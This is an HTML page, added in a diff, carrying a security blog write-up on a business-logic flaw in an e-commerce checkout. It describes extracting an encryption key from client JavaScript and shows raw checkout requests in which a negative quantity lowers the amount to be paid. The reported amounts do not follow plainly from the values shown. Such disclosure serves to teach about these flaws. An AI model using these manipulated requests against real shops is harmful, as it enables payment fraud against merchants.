@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Exploiting Business Logic Error: Price Manipulation — thevillagehacker</title>
+  <meta name="description" content="Exploiting Business Logic Error: Price Manipulation"/>
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,300;0,400;0,500;0,600;1,400&family=Bebas+Neue&display=swap" rel="stylesheet"/>
+  <link rel="stylesheet" href="../assets/css/style.css"/>
+</head>
+<body>
+<div class="page">
+
+  <!-- Navigation -->
+  <nav>
+    <a class="nav-logo" href="../index.html">thevillagehacker</a>
+    <ul class="nav-links">
+      <li><a href="../blog.html">Blog</a></li>
+      <li><a href="../about.html">Whoami</a></li>
+      <li><a href="../changelog.html">Changelog</a></li>
+    </ul>
+  </nav>
+
+  <!-- Post Header -->
+  <div class="post-header">
+    <div class="breadcrumb">
+      <a href="../blog.html">Blog</a><span>→</span>Exploiting Business Logic Error: Price Manipulation
+    </div>
+    <h1 class="post-title">Exploiting Business Logic Error: Price Manipulation</h1>
+    <div class="post-meta">
+      <span>2023-04-12</span>
+      <span>Naveen Jagadeesan</span>
+      <span>thevillagehacker</span>
+    </div>
+  </div>
+
+  <!-- Article Body -->
+  <article>
+<p>This blog discusses the exploitation of a business logic error that allows users to manipulate prices and pay less for the products and services offered by the target company.</p>
+<h2>Target Background</h2>
+<p>The target of this analysis is a web application functioning as an e-commerce platform. It facilitates online purchases of various products and services by users.</p>
+<h2>Overview</h2>
+<p>The Target company previously disclosed a vulnerability report regarding a specific issue: &quot;hackers were able to manipulate the payment amount during the checkout/order process.&quot; To understand the application's fix for this vulnerability, I attempted the same steps to examine the implemented validation mechanisms.</p>
+<h2>Reconnaissance</h2>
+<ul>
+<li>Hosted on AWS</li>
+<li>Utilizes React for web application development</li>
+<li>Mobile application version is also available</li>
+<li>All application requests and responses are encrypted</li>
+</ul>
+<h2>Finding the Encryption Key</h2>
+<p>Upon inspecting the application traffic, I discovered that the JSON payloads in requests and responses were encrypted. To manipulate or interact with these encrypted payloads, I needed to locate the encryption and decryption keys.</p>
+<p>During my analysis of the JavaScript files, I identified the encryption key, the encryption algorithm, the mode, and the initialization vector. Armed with this information, I used online encryption tools to encrypt the payloads.</p>
+<h2>Playing with fire🔥</h2>
+<p>I attempted to modify the price parameter in the request, but the application's validation mechanism prevented any successful manipulation. The amount to be paid was validated against a salted hash that was associated with the purchase order.</p>
+<h2>Actual Request and Response</h2>
+<h3>Request</h3>
+<pre><code class="language-http">POST /api/v1/checkout HTTP/2
+Host: www.target.com
+Cookie: blah...blah...blah...
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://www.target.com/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: iframe
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Te: trailers
+
+{
+  &quot;saltedhash&quot;: &quot;hashcode&quot;,
+  &quot;product_id&quot;: &quot;121212&quot;,
+  &quot;price&quot;: &quot;10&quot;,
+  &quot;quantity&quot;: &quot;10&quot;,
+  &quot;address&quot;: &quot;ABC city, ABC.&quot;,
+  &quot;zipcode&quot;: &quot;123456&quot;
+}
+</code></pre>
+<h3>Response</h3>
+<pre><code class="language-http">HTTP/1.1 200 OK 
+Access-Control-Allow-Origin: * 
+Content-Type: application/json; charset=utf-8 
+Set-Cookie: blah...blah...blah...; Path=/; HttpOnly 
+X-Frame-Options: SAMEORIGIN 
+X-Content-Type-Options: nosniff 
+X-XSS-Protection: 1; mode=block 
+Referrer-Policy: strict-origin-when-cross-origin 
+Connection: close 
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+
+{
+  &quot;saltedhash&quot;: &quot;hashcode&quot;,
+  &quot;product_id&quot;: &quot;121212&quot;,
+  &quot;price&quot;: &quot;10&quot;,
+  &quot;quantity&quot;: &quot;10&quot;,
+  &quot;amount_to_be_paid&quot;: &quot;100&quot;,
+  &quot;address&quot;: &quot;ABC city, ABC.&quot;,
+  &quot;zipcode&quot;: &quot;123456&quot;
+}
+</code></pre>
+<p>The above request represents a checkout request sent to the server to facilitate payment for a purchase order. To address the previously exploited price manipulation vulnerability, the developer implemented an additional parameter named <code>saltedhash</code>.</p>
+<h2>Bypass</h2>
+<p>During my exploration of the application flow and requests, I decided to conduct a deeper investigation of the <code>checkout</code> request. I noticed a parameter called <code>quantity</code>, which was responsible for creating orders based on the desired quantity specified by customers. I attempted to modify this value to a negative number.</p>
+<h2>Manipulated Request</h2>
+<pre><code class="language-http">POST /api/v1/checkout HTTP/2
+Host: www.target.com
+Cookie: blah...blah...blah...
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://www.target.com/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: iframe
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Te: trailers
+
+{
+  &quot;saltedhash&quot;: &quot;hashcode&quot;,
+  &quot;product_id&quot;: &quot;121212&quot;,
+  &quot;price&quot;: &quot;10&quot;,
+  &quot;quantity&quot;: &quot;-5&quot;,
+  &quot;address&quot;: &quot;ABC city, ABC.&quot;,
+  &quot;zipcode&quot;: &quot;123456&quot;
+}
+</code></pre>
+<p>Upon sending the request with a negative value for the <code>quantity</code> parameter, the server responded by adjusting the amount to be paid accordingly. The lack of validation on the <code>quantity</code> parameter allowed negative values to be accepted. As a result, the backend calculation for the amount to be paid was based on the per-quantity price and the number of quantities in the cart.</p>
+<h3>Response</h3>
+<pre><code class="language-http">HTTP/1.1 200 OK 
+Access-Control-Allow-Origin: * 
+Content-Type: application/json; charset=utf-8 
+Set-Cookie: blah...blah...blah...; Path=/; HttpOnly 
+X-Frame-Options: SAMEORIGIN 
+X-Content-Type-Options: nosniff 
+X-XSS-Protection: 1; mode=block 
+Referrer-Policy: strict-origin-when-cross-origin 
+Connection: close 
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+
+{
+  &quot;saltedhash&quot;: &quot;hashcode&quot;,
+  &quot;product_id&quot;: &quot;121212&quot;,
+  &quot;price&quot;: &quot;10&quot;,
+  &quot;quantity&quot;: &quot;-5&quot;,
+  &quot;amount_to_be_paid&quot;: &quot;6&quot;,
+  &quot;address&quot;: &quot;ABC city, ABC.&quot;,
+  &quot;zipcode&quot;: &quot;123456&quot;
+}
+</code></pre>
+<p>By changing the <code>quantity</code> value to a negative number, it was possible to pay a reduced amount for the orders placed.</p>
+<p>Thanks for reading!</p>
+<p>For more updates and insights, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>
+
+  </article>
+
+  <!-- Post Navigation -->
+  <div class="post-nav">
+    <a href="2023-03-30-Account_Takeover-via-session-storage.html" class="post-nav-link prev"><div class="post-nav-dir">← Previous</div><div class="post-nav-title">Account Takeover Through Manipulation of Session Storage</div></a>
+    <a href="2023-05-30-Bypassing_waf_sql_dump.html" class="post-nav-link next"><div class="post-nav-dir">Next →</div><div class="post-nav-title">Bypassing Web Application Firewall (WAF) to Exploit SQL Injection Vulnerabilities</div></a>
+  </div>
+
+  <!-- Footer -->
+  <footer>
+    <span class="footer-text">
+      © 2025 <a href="../index.html">thevillagehacker</a>
+      — Naveen Jagadeesan
+    </span>
+    <span class="footer-text">
+      status: active<span class="blink"></span>
+    </span>
+  </footer>
+
+</div>
+</body>
+</html>
